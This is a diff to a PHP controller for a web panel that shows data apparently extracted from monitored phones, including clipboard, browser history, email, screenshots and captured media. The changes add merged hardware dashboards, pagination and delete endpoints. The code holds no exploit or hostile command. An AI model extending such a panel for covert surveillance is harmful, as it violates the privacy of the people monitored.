@@ -27,11 +27,30 @@ class Advanced extends BaseClientController
      */
     private function getAdvancedNavUrls(string $activeView, array $counts = []): string
     {
-        $hardware_tabs = ['device_context', 'network_info', 'bluetooth', 'sensors', 'camera_info', 'battery_stats', 'processes', 'proc_info', 'cell_towers', 'display_info', 'storage', 'thermal', 'nfc', 'hardware_graphics', 'hardware_network', 'audio_devices', 'biometric', 'gnss_hardware', 'power_rails', 'usb_devices', 'vibration'];
-        $software_tabs = ['accounts', 'calendar', 'app_usage', 'notifications', 'security_audit', 'accessibility', 'input_methods', 'remote_media', 'data_usage', 'saved_wifi', 'default_apps', 'alarms', 'app_security', 'network_security', 'telephony_network', 'system_locale', 'app_permissions', 'browser_history', 'clipboard', 'content_providers', 'crash_logs', 'digital_wellbeing', 'doze_standby', 'email', 'health_data', 'keyboard_input', 'keyguard', 'screenshots', 'screen_state', 'vpn_config', 'running_processes'];
+        $hardware_tabs = [
+            // Individual hardware pages
+            'device_context', 'network_info', 'bluetooth', 'sensors', 'camera_info',
+            'battery_stats', 'processes', 'proc_info', 'cell_towers', 'display_info',
+            'storage', 'thermal', 'nfc', 'hardware_graphics', 'hardware_network',
+            'audio_devices', 'biometric', 'gnss_hardware', 'power_rails', 'usb_devices',
+            'vibration', 'sim_configs',
+            // Merged hardware pages
+            'hardware_dashboard', 'battery_power', 'system_performance', 'network_connectivity',
+            'display_graphics', 'sensors_location', 'media_hardware', 'storage_peripherals',
+            'shortrange_auth', 'device_fingerprint', 'hardware_landing'
+        ];
+        $software_tabs = [
+            'accounts', 'calendar', 'app_usage', 'notifications', 'security_audit',
+            'accessibility', 'input_methods', 'remote_media', 'data_usage', 'saved_wifi',
+            'default_apps', 'alarms', 'app_security', 'network_security', 'telephony_network',
+            'system_locale', 'app_permissions', 'browser_history', 'clipboard',
+            'content_providers', 'crash_logs', 'digital_wellbeing', 'doze_standby',
+            'email', 'health_data', 'keyboard_input', 'keyguard', 'screenshots',
+            'screen_state', 'vpn_config', 'running_processes', 'software_landing'
+        ];
 
-        $is_hardware = in_array($activeView, $hardware_tabs) || $activeView === 'hardware_landing';
-        $is_software = in_array($activeView, $software_tabs) || $activeView === 'software_landing';
+        $is_hardware = in_array($activeView, $hardware_tabs);
+        $is_software = in_array($activeView, $software_tabs);
 
         $html = '<div class="d-flex justify-content-end flex-wrap mb-3" style="gap: 8px;">';
         $html .= sprintf(
@@ -79,11 +98,15 @@ class Advanced extends BaseClientController
     /** GET /advanced/accounts */
     public function accounts()
     {
-        $data = array_merge($this->commonData('accounts', 'Device Accounts'), [
-            'rows' => $this->finderModel->get_accounts($this->userId),
-            'total' => $this->finderModel->get_count_Accounts($this->userId),
-            'pager' => $this->finderModel->getPager(),
+        $builder = $this->finderModel->getAccountsQuery($this->userId);
+        [$rows, $pager, $total] = $this->paginate($builder, 25);
+
+        $data = array_merge($this->commonData('accounts', 'Accounts'), [
+            'rows'     => $rows,
+            'total'    => $total,
+            'pager'    => $pager,
         ]);
+
         return $this->renderAppView('users/advanced/accounts', $data);
     }
 
@@ -512,9 +535,21 @@ class Advanced extends BaseClientController
     /** GET /advanced/media */
     public function remote_media()
     {
+        [$rows, $pager, $total] = $this->paginate(
+            $this->finderModel->tableQuery('tbl_captured_media', $this->userId, 'created_at', 'DESC')
+        );
+
+        foreach ($rows as &$r) {
+            $r['created_at_display'] = isset($r['created_at'])
+                ? date('M d, Y, H:i (l)', strtotime($r['created_at']))
+                : '—';
+        }
+        unset($r);
+
         $data = array_merge($this->commonData('remote_media', 'Remote Media Forensic'), [
-            'rows' => $this->finderModel->get_captured_media($this->userId),
-            'total' => $this->finderModel->get_count_CapturedMedia($this->userId),
+            'rows' => $rows,
+            'total' => $total,
+            'pager' => $pager,
         ]);
         return $this->renderAppView('users/advanced/remote_media', $data);
     }
@@ -806,9 +841,12 @@ class Advanced extends BaseClientController
     /** GET /advanced/proc_info */
     public function proc_info()
     {
+        $rows = $this->finderModel->get_proc_info($this->userId);
+
         $data = array_merge($this->commonData('proc_info', 'Proc Info'), [
-            'rows' => $this->finderModel->get_proc_info($this->userId),
+            'rows' => $rows,
             'total' => $this->finderModel->get_count_ProcInfo($this->userId),
+            'pager' => $this->finderModel->getPager(),
         ]);
         return $this->renderAppView('users/advanced/proc_info', $data);
     }
@@ -1246,6 +1284,511 @@ class Advanced extends BaseClientController
             return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
         }
         if ($this->finderModel->delete_vibration_row((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // MERGED HARDWARE PAGES
+    // ═══════════════════════════════════════════════════════════════
+
+    private function getTimestampColumn(string $table): string
+    {
+        return match ($table) {
+            'tbl_device_profile' => 'extraction_timestamp',
+            default => 'extracted_at',
+        };
+    }
+
+    private function getLatestRecord(string $table, int $userId): ?array
+    {
+        $tsCol = $this->getTimestampColumn($table);
+        $db = \Config\Database::connect();
+        return $db->table($table)
+            ->where('owner_id', $userId)
+            ->orderBy($tsCol, 'DESC')
+            ->limit(1)
+            ->get()
+            ->getRowArray();
+    }
+
+    private function getMergedHistory(string $mainTable, array $joinTables, int $userId, int $perPage = 50): array
+    {
+        $db = \Config\Database::connect();
+        $page = service('request')->getGet('page') ?? 1;
+        $offset = ($page - 1) * $perPage;
+        $tsCol = $this->getTimestampColumn($mainTable);
+
+        $timestamps = $db->table("{$mainTable} m")
+            ->where('owner_id', $userId)
+            ->select("DISTINCT {$tsCol}", false)
+            ->orderBy($tsCol, 'DESC')
+            ->limit($perPage, $offset)
+            ->get()
+            ->getResultArray();
+
+        if (empty($timestamps)) {
+            return [];
+        }
+
+        $tsList = array_column($timestamps, $tsCol);
+        $results = [];
+        foreach ($tsList as $ts) {
+            $row = ['extracted_at' => $ts];
+            foreach ($joinTables as $alias => $table) {
+                $joinTsCol = $this->getTimestampColumn($table);
+                $record = $db->table("{$table} {$alias}")
+                    ->where('owner_id', $userId)
+                    ->where("{$joinTsCol} <=", $ts)
+                    ->orderBy($joinTsCol, 'DESC')
+                    ->limit(1)
+                    ->get()
+                    ->getRowArray();
+                $row[$alias] = $record ?: [];
+            }
+            $results[] = $row;
+        }
+
+        return $results;
+    }
+
+    private function getMergedHistoryCount(string $mainTable, int $userId): int
+    {
+        $db = \Config\Database::connect();
+        return (int) $db->table($mainTable)
+            ->where('owner_id', $userId)
+            ->countAllResults();
+    }
+
+    /** GET /advanced/hardware/dashboard */
+    public function hardware_dashboard()
+    {
+        $userId = $this->userId;
+        $latest_dc = $this->getLatestRecord('tbl_device_context', $userId);
+        $latest_bs = $this->getLatestRecord('tbl_battery_stats', $userId);
+        $latest_th = $this->getLatestRecord('tbl_thermal', $userId);
+        $latest_st = $this->getLatestRecord('tbl_storage', $userId);
+        $latest_ni = $this->getLatestRecord('tbl_network_info', $userId);
+
+        $history = $this->getMergedHistory('tbl_device_context', [
+            'dc' => 'tbl_device_context',
+            'bs' => 'tbl_battery_stats',
+            'th' => 'tbl_thermal',
+            'st' => 'tbl_storage',
+            'ni' => 'tbl_network_info',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_device_context', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('hardware_dashboard', 'Hardware Dashboard'), [
+            'latest_dc' => $latest_dc,
+            'latest_bs' => $latest_bs,
+            'latest_th' => $latest_th,
+            'latest_st' => $latest_st,
+            'latest_ni' => $latest_ni,
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/hardware_dashboard', $data);
+    }
+
+    /** GET /advanced/hardware/battery_power */
+    public function battery_power()
+    {
+        $userId = $this->userId;
+        $latest_dc = $this->getLatestRecord('tbl_device_context', $userId);
+        $latest_bs = $this->getLatestRecord('tbl_battery_stats', $userId);
+
+        $history = $this->getMergedHistory('tbl_device_context', [
+            'dc' => 'tbl_device_context',
+            'bs' => 'tbl_battery_stats',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_device_context', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('battery_power', 'Battery & Power'), [
+            'latest_dc' => $latest_dc,
+            'latest_bs' => $latest_bs,
+            'latest' => [
+                'device_context' => $latest_dc,
+                'battery_stats' => $latest_bs,
+            ],
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/battery_power', $data);
+    }
+
+    /** GET /advanced/hardware/system_performance */
+    public function system_performance()
+    {
+        $userId = $this->userId;
+        $latest_pi = $this->getLatestRecord('tbl_proc_info', $userId);
+        $latest_th = $this->getLatestRecord('tbl_thermal', $userId);
+        $latest_pr = $this->getLatestRecord('tbl_power_rails', $userId);
+
+        $history = $this->getMergedHistory('tbl_proc_info', [
+            'pi' => 'tbl_proc_info',
+            'th' => 'tbl_thermal',
+            'pr' => 'tbl_power_rails',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_proc_info', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('system_performance', 'System Performance'), [
+            'latest_proc' => $latest_pi,
+            'latest_th' => $latest_th,
+            'latest_pr' => $latest_pr,
+            'latest' => [
+                'proc_info' => $latest_pi,
+                'thermal' => $latest_th,
+                'power_rails' => $latest_pr,
+            ],
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/system_performance', $data);
+    }
+
+    /** GET /advanced/hardware/network_connectivity */
+    public function network_connectivity()
+    {
+        $userId = $this->userId;
+        $latest_ni = $this->getLatestRecord('tbl_network_info', $userId);
+        $latest_nh = $this->getLatestRecord('tbl_hardware_network', $userId);
+        $latest_ct = $this->getLatestRecord('tbl_cell_towers', $userId);
+
+        $history = $this->getMergedHistory('tbl_network_info', [
+            'ni' => 'tbl_network_info',
+            'nh' => 'tbl_hardware_network',
+            'ct' => 'tbl_cell_towers',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_network_info', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('network_connectivity', 'Network & Connectivity'), [
+            'latest_ni' => $latest_ni,
+            'latest_nh' => $latest_nh,
+            'latest_ct' => $latest_ct,
+            'latest' => [
+                'network_info' => $latest_ni,
+                'hardware_network' => $latest_nh,
+                'cell_towers' => $latest_ct,
+            ],
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/network_connectivity', $data);
+    }
+
+    /** GET /advanced/hardware/display_graphics */
+    public function display_graphics()
+    {
+        $userId = $this->userId;
+        $latest_di = $this->getLatestRecord('tbl_display_info', $userId);
+        $latest_hg = $this->getLatestRecord('tbl_hardware_graphics', $userId);
+
+        $history = $this->getMergedHistory('tbl_display_info', [
+            'di' => 'tbl_display_info',
+            'hg' => 'tbl_hardware_graphics',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_display_info', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('display_graphics', 'Display & Graphics'), [
+            'latest_di' => $latest_di,
+            'latest_hg' => $latest_hg,
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/display_graphics', $data);
+    }
+
+    /** GET /advanced/hardware/sensors_location */
+    public function sensors_location()
+    {
+        $userId = $this->userId;
+        $latest_sp = $this->getLatestRecord('tbl_sensor_profile', $userId);
+        $latest_gh = $this->getLatestRecord('tbl_gnss_hardware', $userId);
+        $latest_vb = $this->getLatestRecord('tbl_vibration', $userId);
+
+        $history = $this->getMergedHistory('tbl_sensor_profile', [
+            'sp' => 'tbl_sensor_profile',
+            'gh' => 'tbl_gnss_hardware',
+            'vb' => 'tbl_vibration',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_sensor_profile', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('sensors_location', 'Sensors & Location'), [
+            'latest_sp' => $latest_sp,
+            'latest_gh' => $latest_gh,
+            'latest_vb' => $latest_vb,
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/sensors_location', $data);
+    }
+
+    /** GET /advanced/hardware/media_hardware */
+    public function media_hardware()
+    {
+        $userId = $this->userId;
+        $latest_ci = $this->getLatestRecord('tbl_camera_info', $userId);
+        $latest_ad = $this->getLatestRecord('tbl_audio_devices', $userId);
+
+        $history = $this->getMergedHistory('tbl_camera_info', [
+            'ci' => 'tbl_camera_info',
+            'ad' => 'tbl_audio_devices',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_camera_info', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('media_hardware', 'Media Hardware'), [
+            'latest_ci' => $latest_ci,
+            'latest_ad' => $latest_ad,
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/media_hardware', $data);
+    }
+
+    /** GET /advanced/hardware/storage_peripherals */
+    public function storage_peripherals()
+    {
+        $userId = $this->userId;
+        $latest_st = $this->getLatestRecord('tbl_storage', $userId);
+        $latest_ud = $this->getLatestRecord('tbl_usb_devices', $userId);
+
+        $history = $this->getMergedHistory('tbl_storage', [
+            'st' => 'tbl_storage',
+            'ud' => 'tbl_usb_devices',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_storage', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('storage_peripherals', 'Storage & Peripherals'), [
+            'latest_st' => $latest_st,
+            'latest_ud' => $latest_ud,
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/storage_peripherals', $data);
+    }
+
+    /** GET /advanced/hardware/shortrange_auth */
+    public function shortrange_auth()
+    {
+        $userId = $this->userId;
+        $latest_bt = $this->getLatestRecord('tbl_bluetooth', $userId);
+        $latest_nf = $this->getLatestRecord('tbl_nfc', $userId);
+        $latest_bm = $this->getLatestRecord('tbl_biometric', $userId);
+
+        $history = $this->getMergedHistory('tbl_bluetooth', [
+            'bt' => 'tbl_bluetooth',
+            'nf' => 'tbl_nfc',
+            'bm' => 'tbl_biometric',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_bluetooth', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('shortrange_auth', 'Short-Range & Auth'), [
+            'latest_bt' => $latest_bt,
+            'latest_nf' => $latest_nf,
+            'latest_bm' => $latest_bm,
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/shortrange_auth', $data);
+    }
+
+    /** GET /advanced/hardware/device_fingerprint */
+    public function device_fingerprint()
+    {
+        $userId = $this->userId;
+        $latest_dp = $this->getLatestRecord('tbl_device_profile', $userId);
+        $latest_hg = $this->getLatestRecord('tbl_hardware_graphics', $userId);
+        $latest_sp = $this->getLatestRecord('tbl_sensor_profile', $userId);
+        $latest_ci = $this->getLatestRecord('tbl_camera_info', $userId);
+
+        $history = $this->getMergedHistory('tbl_device_profile', [
+            'dp' => 'tbl_device_profile',
+            'hg' => 'tbl_hardware_graphics',
+            'sp' => 'tbl_sensor_profile',
+            'ci' => 'tbl_camera_info',
+        ], $userId);
+
+        $total = $this->getMergedHistoryCount('tbl_device_profile', $userId);
+        $pager = service('pager');
+        $pager->makeLinks(service('request')->getGet('page') ?? 1, 50, $total, 'bootstrap5_full');
+
+        $data = array_merge($this->commonData('device_fingerprint', 'Device Fingerprint'), [
+            'latest_dp' => $latest_dp,
+            'latest_hg' => $latest_hg,
+            'latest_sp' => $latest_sp,
+            'latest_ci' => $latest_ci,
+            'history' => $history,
+            'total' => $total,
+            'pager' => $pager,
+        ]);
+
+        return $this->renderAppView('users/advanced/device_fingerprint', $data);
+    }
+
+    // ── Merged Hardware Delete Methods ──
+
+    /** POST /advanced/hardware/hardware_dashboard/delete/(:num) */
+    public function delete_hardware_dashboard($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_device_context_row((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    /** POST /advanced/hardware/battery_power/delete/(:num) */
+    public function delete_battery_power($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_battery_stats_row((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    /** POST /advanced/hardware/system_performance/delete/(:num) */
+    public function delete_system_performance($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_proc_info_row((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    /** POST /advanced/hardware/network_connectivity/delete/(:num) */
+    public function delete_network_connectivity($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_network_info_row((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    /** POST /advanced/hardware/display_graphics/delete/(:num) */
+    public function delete_display_graphics($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_display_info_row((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    /** POST /advanced/hardware/sensors_location/delete/(:num) */
+    public function delete_sensors_location($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_sensor_profile((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    /** POST /advanced/hardware/media_hardware/delete/(:num) */
+    public function delete_media_hardware($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_camera_info_row((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    /** POST /advanced/hardware/storage_peripherals/delete/(:num) */
+    public function delete_storage_peripherals($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_storage_row((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    /** POST /advanced/hardware/shortrange_auth/delete/(:num) */
+    public function delete_shortrange_auth($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_bluetooth_row((int) $id, $this->userId)) {
+            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
+        }
+        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
+    }
+
+    /** POST /advanced/hardware/device_fingerprint/delete/(:num) */
+    public function delete_device_fingerprint($id)
+    {
+        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
+            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
+        }
+        if ($this->finderModel->delete_device_profile_row((int) $id, $this->userId)) {
             return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
         }
         return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
